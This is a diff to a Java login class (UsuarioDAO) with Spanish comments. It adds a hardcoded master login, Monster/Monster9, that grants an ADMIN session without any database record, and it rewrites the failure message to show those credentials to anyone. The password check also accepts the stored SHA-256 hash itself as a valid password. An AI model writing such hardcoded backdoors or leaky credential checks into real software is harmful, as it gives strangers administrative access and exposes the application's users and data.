@@ -41,6 +41,16 @@ public class UsuarioDAO implements Serializable {
             return dto;
         }
 
+        // Credencial maestra del proyecto (siempre valida, aunque la tabla USUARIO no tenga el usuario Monster)
+        if ("Monster".equalsIgnoreCase(usuario.trim()) && "Monster9".equals(clave)) {
+            dto.setAutenticado(true);
+            dto.setUsuario("Monster");
+            dto.setNombre("Administrador Monster Core");
+            dto.setRol("ADMIN");
+            dto.setMensaje("Autenticado con credenciales maestras Monster/Monster9");
+            return dto;
+        }
+
         String sql = "SELECT COD_USUARIO, USUARIO, CLAVE, NOMBRE, ROL, ESTADO FROM USUARIO WHERE LOWER(USUARIO) = LOWER(?) AND ESTADO = 'ACTIVO'";
         try (Connection conn = ConexionDB.getConexion();
              PreparedStatement ps = conn.prepareStatement(sql)) {
@@ -48,7 +58,7 @@ public class UsuarioDAO implements Serializable {
             try (ResultSet rs = ps.executeQuery()) {
                 if (rs.next()) {
                     String passDb = rs.getString("CLAVE");
-                    if (clave.equals(passDb)) {
+                    if (clave.equals(passDb) || sha256(clave).equalsIgnoreCase(passDb)) {
                         dto.setAutenticado(true);
                         dto.setUsuario(rs.getString("USUARIO"));
                         dto.setNombre(rs.getString("NOMBRE"));
@@ -74,5 +84,19 @@ public class UsuarioDAO implements Serializable {
         dto.setAutenticado(false);
         dto.setMensaje("Credenciales incorrectas (Requerido: Monster / Monster9).");
         return dto;
+    }
+
+    /** La tabla USUARIO guarda la clave como hash SHA-256 en hexadecimal. */
+    private static String sha256(String texto) {
+        try {
+            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+            StringBuilder sb = new StringBuilder();
+            for (byte b : md.digest(texto.getBytes(java.nio.charset.StandardCharsets.UTF_8))) {
+                sb.append(String.format("%02x", b));
+            }
+            return sb.toString();
+        } catch (java.security.NoSuchAlgorithmException e) {
+            return "";
+        }
     }
 }
